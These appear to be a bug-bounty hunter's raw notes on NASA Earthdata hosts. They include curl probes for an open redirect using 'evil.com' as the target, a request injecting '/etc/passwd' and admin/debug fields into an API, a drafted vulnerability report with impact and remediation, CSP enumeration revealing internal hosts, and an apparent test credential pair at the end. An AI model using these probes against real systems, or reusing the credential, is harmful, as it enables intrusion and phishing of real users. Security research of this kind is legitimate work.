scope [https://usgeo.gov/]

```
https://shapememory.grc.nasa.gov/ 

this endpoint will come soon update feature
```

```
https://wallops-prf.gsfc.nasa.gov

somthing in this i think? need more enumeration in it
```

```
# nothing
https://sandbox-dash.uat.earthdatacloud.nasa.gov
https://sams.grc.nasa.gov
https://mmt.uat.earthdata.nasa.gov

```


```
# found but dont work

https://uat.urs.earthdata.nasa.gov/

ajdev@rootbox:~/nassa$ curl -v "https://api.mmt.uat.earthdatacloud.nasa.gov/login?target=//evil.com" 2>&1 | grep -i "location"
< location: https://uat.urs.earthdata.nasa.gov/oauth/authorize?response_type=code&client_id=zFb4tV63ET-V6-oRnDKmJg&redirect_uri=https%3A%2F%2Fapi.mmt.uat.earthdatacloud.nasa.gov%2Furs_callback&state=%257B%2522target%2522%253A%2522%252F%252Fevil.com%2522%257D

ajdev@rootbox:~/nassa$ curl -v "https://api.mmt.uat.earthdatacloud.nasa.gov/login?target=%2F%2Fevil.com" 2>&1 | grep -i "location\|state"
< location: https://uat.urs.earthdata.nasa.gov/oauth/authorize?response_type=code&client_id=zFb4tV63ET-V6-oRnDKmJg&redirect_uri=https%3A%2F%2Fapi.mmt.uat.earthdatacloud.nasa.gov%2Furs_callback&state=%257B%2522target%2522%253A%2522%252F%252Fevil.com%2522%257D4

ajdev@rootbox:~/nassa$ echo "%257B%2522target%2522%253A%2522https%253A%252F%252Fevil.com%2522%257D" | python3 -c "import sys,urllib.parse; print(urllib.parse.unquote(urllib.parse.unquote(sys.stdin.read())))"
{"target":"https://evil.com"}

Resource: https://github.com/nasa/mmt/blob/DRAFT-MMT/app/controllers/application_controller.rb

Register a FREE Earthdata account:
https://urs.earthdata.nasa.gov/users/new
 
 but the site is not open ??
 
 We are in the process of migrating all NASA Earth science data sites into Earthdata from now until end of 2026. Not all NASA Earth science data and resources will appear here until then. Thank you for your patience as we make this transition.


ajdev@rootbox:~/nassa$ curl -v "https://api.mmt.earthdatacloud.nasa.gov/login?target=https://evil.com"
* Host api.mmt.earthdatacloud.nasa.gov:443 was resolved.
* IPv6: (none)
* IPv4: 3.164.182.58, 3.164.182.7, 3.164.182.61, 3.164.182.14
*   Trying 3.164.182.58:443...
* Connected to api.mmt.earthdatacloud.nasa.gov (3.164.182.58) port 443
* ALPN: curl offers h2,http/1.1
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
*  CAfile: /etc/ssl/certs/ca-certificates.crt
*  CApath: /etc/ssl/certs
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
* TLSv1.3 (IN), TLS handshake, Certificate (11):
* TLSv1.3 (IN), TLS handshake, CERT verify (15):
* TLSv1.3 (IN), TLS handshake, Finished (20):
* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.3 (OUT), TLS handshake, Finished (20):
* SSL connection using TLSv1.3 / TLS_AES_128_GCM_SHA256 / X25519 / RSASSA-PSS
* ALPN: server accepted h2
* Server certificate:
*  subject: CN=api.mmt.earthdatacloud.nasa.gov
*  start date: May  8 00:00:00 2025 GMT
*  expire date: Jun  3 23:59:59 2026 GMT
*  subjectAltName: host "api.mmt.earthdatacloud.nasa.gov" matched cert's "api.mmt.earthdatacloud.nasa.gov"
*  issuer: C=US; O=Amazon; CN=Amazon RSA 2048 M03
*  SSL certificate verify ok.
*   Certificate level 0: Public key type RSA (2048/112 Bits/secBits), signed using sha256WithRSAEncryption
*   Certificate level 1: Public key type RSA (2048/112 Bits/secBits), signed using sha256WithRSAEncryption
*   Certificate level 2: Public key type RSA (2048/112 Bits/secBits), signed using sha256WithRSAEncryption
* using HTTP/2
* [HTTP/2] [1] OPENED stream for https://api.mmt.earthdatacloud.nasa.gov/login?target=https://evil.com
* [HTTP/2] [1] [:method: GET]
* [HTTP/2] [1] [:scheme: https]
* [HTTP/2] [1] [:authority: api.mmt.earthdatacloud.nasa.gov]
* [HTTP/2] [1] [:path: /login?target=https://evil.com]
* [HTTP/2] [1] [user-agent: curl/8.5.0]
* [HTTP/2] [1] [accept: */*]
> GET /login?target=https://evil.com HTTP/2
> Host: api.mmt.earthdatacloud.nasa.gov
> User-Agent: curl/8.5.0
> Accept: */*
>
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
< HTTP/2 307
< content-type: application/json
< content-length: 0
< location: https://urs.earthdata.nasa.gov/oauth/authorize?response_type=code&client_id=QCuabaWMrGyq0OvCj0X-pg&redirect_uri=https%3A%2F%2Fapi.mmt.earthdatacloud.nasa.gov%2Furs_callback&state=%257B%2522target%2522%253A%2522https%253A%252F%252Fevil.com%2522%257D
< date: Tue, 24 Mar 2026 12:43:39 GMT
< x-amzn-remapped-date: Tue, 24 Mar 2026 12:43:39 GMT
< x-amzn-requestid: 3bce3016-6192-4507-be21-4ffe9b58dcce
< x-amzn-remapped-x-amzn-requestid: 610220ab-159d-4589-a7bb-c12eef658e0b
< x-xss-protection: 1; mode=block
< strict-transport-security: max-age=31536000; includeSubDomains; preload
< x-amzn-remapped-content-length: 0
< x-frame-options: SAMEORIGIN
< x-amzn-remapped-connection: keep-alive
< x-amz-apigw-id: auoHWG1eIAMEFcQ=
< x-amzn-remapped-server: Server
< x-content-type-options: nosniff
< x-amzn-trace-id: Root=1-69c286fb-2dd7a6f878a2d998384f62e5;Parent=2fe8f66445fc1e77;Sampled=0;Lineage=1:d0782663:0
< x-amzn-remapped-x-forwarded-for: 45.123.221.227, 3.172.24.47
< x-cache: Miss from cloudfront
< via: 1.1 50670bbe069958a9395e2bcdad1d54d4.cloudfront.net (CloudFront)
< x-amz-cf-pop: MRS53-P1
< x-amz-cf-id: SQD29ZJ_kHCfOUGFHnVlYTxz1R6QLIxTTsuFwkPWbfHvCiThP3ozhw==
<
* Connection #0 to host api.mmt.earthdatacloud.nasa.gov left intact
```

```
s://dispserviceapi-725472350.auto.earthdatacloud.nasa.gov/get_frame_id \
-H "Content-Type: application/json" \
-d '{
  "wkt": "POLYGON((-120 34, -120 36, -118 36, -118 34, -120 34))"
}'
{"frame_ids":["16940","16941","16942","36540","36541","36542"],"wkt":"POLYGON((-120 34, -120 36, -118 36, -118 34, -120 34))"}


ajdev@rootbox:~$ curl -X POST "https://dispserviceapi-725472350.auto.earthdatacloud.nasa.gov/timeseries" \
-H "Content-Type: application/json" \
-d '{
  "wkt": "POLYGON((-120 34, -120 36, -118 36, -118 34, -120 34))",
  "bucket": "test",
  "frameId": "16940",
  "admin": true,
  "debug": true,
  "file": "/etc/passwd"
}'
{"detail":"No data found for the given area of interest POLYGON((-120 34, -120 36, -118 36, -118 34, -120 34))"}

ajdev@rootbox:~$ curl -X POST "https://dispserviceapi-725472350.auto.earthdatacloud.nasa.gov/timeseries" -H "Content-Type: applicacurl -X POST "https://dispserviceapi-725472350.auto.earthdatacloud.nasa.gov/timeseries" -H "Content-Type: application/json" -d '{
  "wkt": "POLYGON((-120 34, -120 36, -118 36, -118 34, -120 34))",
  "bucket": {"test":"abc"},
  "frameId": "12345",
  "admin": true,
  "debug": true,
  "file": "/etc/passwd"
}'
{"detail":[{"type":"string_type","loc":["body","bucket"],"msg":"Input should be a valid string","input":{"test":"abc"},"url":"https://errors.pydantic.dev/2.11/v/string_type"}]}

ajdev@rootbox:~$ curl -X POST "https://dispserviceapi-725472350.aucurl -X POST "https://dispserviceapi-725472350.auto.earthdatacloud.nasa.gov/frame_intersection" \
-H "Content-Type: application/json" \
-d '{
  "wkt": "POLYGON((-120 34, -120 36, -118 36, -118 34, -120 34))"
}'
{"16940":"POLYGON ((-118.861808 34.035838, -118.858161 34.03643, -118.893701 34.188645, -118.935791 34.368557, -118.456511 34.445987, -118.039508 34.511822, -118.050184 34.559725, -118 34.56740221209699, -118 34, -118.853455424711 34, -118.861808 34.035838))","16941":"POLYGON ((-118.9713 34.520003, -119.010177 34.685506, -119.049391 34.852101, -119.088723 35.018849, -119.128054 35.18524, -119.170562 35.364692, -119.169995 35.364782, -119.206014 35.530987, -119.245567 35.697287, -118.758293 35.774648, -118.334611 35.840296, -118.345432 35.888174, -118 35.93996710495309, -118 34.30753528707505, -118.411102 34.24676, -118.890234 34.173827, -118.932538 34.354653, -118.9713 34.520003))","16942":"POLYGON ((-119.28157 35.848296, -119.31780902959349 36, -118 36, -118 35.74713986553674, -118.274912 35.708147, -118.259786 35.641067, -118.712193 35.575436, -119.199257 35.502579, -119.241734 35.681173, -119.28157 35.848296))","36540":"POLYGON ((-119.653335 34.851813, -119.206816 34.918109, -119.219457 34.977844, -118.778815 35.041923, -118.354373 35.102135, -118.321064 34.936283, -118.321061 34.936283, -118.317708 34.919572, -118.313238 34.897314, -118.313242 34.897313, -118.287784 34.770424, -118.28778 34.770425, -118.283911 34.751125, -118.279966 34.73146, -118.27997 34.73146, -118.254534 34.604559, -118.25453 34.60456, -118.250242 34.583147, -118.246725 34.5656, -118.246728 34.5656, -118.213514 34.399733, -118.21501 34.399535, -118.189613 34.272599, -118.18961 34.272599, -118.186459 34.256835, -118.181823 34.233665, -118.181827 34.233664, -118.156451 34.106713, -118.156447 34.106714, -118.152448 34.08669, -118.148669 34.067785, -118.148672 34.067785, -118.1351350744784 34, -120 34, -120 34.798951048118056, -119.653335 34.851813))","36541":"POLYGON ((-118.519184 35.931599, -118.519179 35.9316, -118.519098 35.931175, -118.511299 35.892578, -118.51173 35.892522, -118.480081 35.72648, -118.480085 35.72648, -118.454508 35.599648, -118.454504 35.599649, -118.450312 35.578841, -118.446646 35.56066, -118.44665 35.56066, -118.421098 35.433816, -118.421094 35.433817, -118.417266 35.414793, -118.413245 35.394834, -118.413249 35.394833, -118.387721 35.267978, -118.387717 35.267979, -118.383676 35.247879, -118.379877 35.229, -118.379881 35.229, -118.354376 35.102135, -118.354373 35.102135, -118.351015 35.085416, -118.346541 35.06316, -118.346545 35.063159, -118.313238 34.897314, -118.737539 34.841668, -119.150402 34.785893, -119.13855 34.729763, -119.61246 34.663516, -120 34.60760464823284, -120 36, -118.5330052285401 36, -118.519184 35.931599))","36542":"POLYGON ((-119.899342 35.991632, -120 35.97740204325512, -120 36, -119.83815015878123 36, -119.899342 35.991632))"}ajdev@rootbox:~$


```



```
## Summary
The /login endpoint accepts an unvalidated `target` parameter that is 
stored directly in the OAuth state. After successful login, the 
/urs_callback endpoint reads this value and redirects the user to it 
without any domain validation, allowing redirection to external sites.

## Proof of Concept

Command:
curl -v "https://api.mmt.earthdatacloud.nasa.gov/login?target=https://bugcrowd.com"

Response:
HTTP/2 307
Location: https://urs.earthdata.nasa.gov/oauth/authorize?response_type=code
&client_id=QCuabaWMrGyq0OvCj0X-pg
&redirect_uri=https%3A%2F%2Fapi.mmt.earthdatacloud.nasa.gov%2Furs_callback
&state=%257B%2522target%2522%253A%2522https%253A%252F%252Fbugcrowd.com%2522%257D

Decoded state confirms external URL stored unvalidated:
{"target":"https://bugcrowd.com"}

Same behavior confirmed on UAT:
curl -v "https://api.mmt.uat.earthdatacloud.nasa.gov/login?target=https://bugcrowd.com"
Decoded state: {"target":"https://bugcrowd.com"}

## Steps to Reproduce
1. Visit https://api.mmt.earthdatacloud.nasa.gov/login?target=https://bugcrowd.com
2. Server returns 307 redirect to NASA OAuth login
3. Complete OAuth login with valid Earthdata credentials
4. After login /urs_callback reads target from state and redirects to bugcrowd.com

## Impact
An attacker can send a crafted login URL to NASA MMT users. Because 
the redirect starts from the legitimate NASA OAuth page, victims 
have no reason to suspect the link. After logging in with real NASA 
credentials they are silently redirected to an attacker-controlled 
site enabling phishing and session token theft.

## Affected Endpoints
- https://api.mmt.earthdatacloud.nasa.gov/login
- https://api.mmt.uat.earthdatacloud.nasa.gov/login

## Source Code Reference
https://github.com/nasa/mmt/blob/master/app/controllers/application_controller.rb

  def redirect_after_login
    return_to = session.delete(:return_to)
    redirect_to return_to || last_point || internal_landing_page
  end

No validation applied to return_to before redirect.

## Remediation
Validate target against an allowlist of trusted domains 
(*.nasa.gov, *.earthdata.nasa.gov) before storing in session.
```



```
ajdev@rootbox:~$ curl -s -I https://www.jpl.nasa.gov/newsletter-signup/ | grep -i "content-security-policy" | tr ';' '\n' | grep -iE "127.0.0.1|localhost|54.212"
 frame-ancestors 'self' http://localhost:8000/ http://localhost:3000/ https://*.jpl.nasa.gov/ https://*.nasa.gov/
 img-src 'self' https://www.googletagmanager.com/ https://i.ytimg.com/ https://www.google-analytics.com/ https://app.icontact.com/ http://localhost:3000/ http://127.0.0.1:9000/ https://*.cloudfront.net/ https://*.jpl.nasa.gov/ https://*.nasa.gov/ data:
 script-src 'self' blob: https://eyes.nasa.gov/ http://localhost:3000/ https://cdnjs.cloudflare.com/ https://script.crazyegg.com/ https://tracking.crazyegg.com/ https://www.surveymonkey.com/ https://www.google.com/ https://www.gstatic.com/ https://www.google-analytics.com/ https://www.googletagmanager.com/ https://dap.digitalgov.gov/ https://app.icontact.com/ https://*.nasa.gov/ https://*.jpl.nasa.gov/ 'unsafe-eval' 'unsafe-inline'
 frame-src 'self' http://localhost:3000/ https://td.doubleclick.net/ https://www.youtube.com/ https://*.google.com/ https://player.vimeo.com/ https://www.soundcloud.com/ https://www.surveymonkey.com/ https://d2pn8kiwq2w21t.cloudfront.net/ https://*.github.com/ https://eyes.nasa.gov/ https://*.nasa.gov/ https://*.jpl.nasa.gov/ 'unsafe-inline'
 connect-src 'self' http://localhost:3000/ https://stats.g.doubleclick.net/ https://script.crazyegg.com/ https://tracking.crazyegg.com/ https://app.icontact.com/ https://www.google-analytics.com/ https://analytics.google.com/ http://54.212.171.253/ https://docs.google.com/ https://dap.digitalgov.gov/ https://app.icontact.com/ https://*.cloudfront.net/ https://*.nasa.gov/ https://*.jpl.nasa.gov/ https://www.google.com/recaptcha/ https://*.execute-api.us-gov-west-1.amazonaws.com/
 media-src 'self' http://localhost:3000/ https://*.cloudfront.net/ http://127.0.0.1:9000/ 'unsafe-eval' 'unsafe-inline'
 
 http://54.212.171.253
 http://54.212.171.253:9000/
 http://54.212.171.253:3000/
```

```
testdata
Testdata4145@
```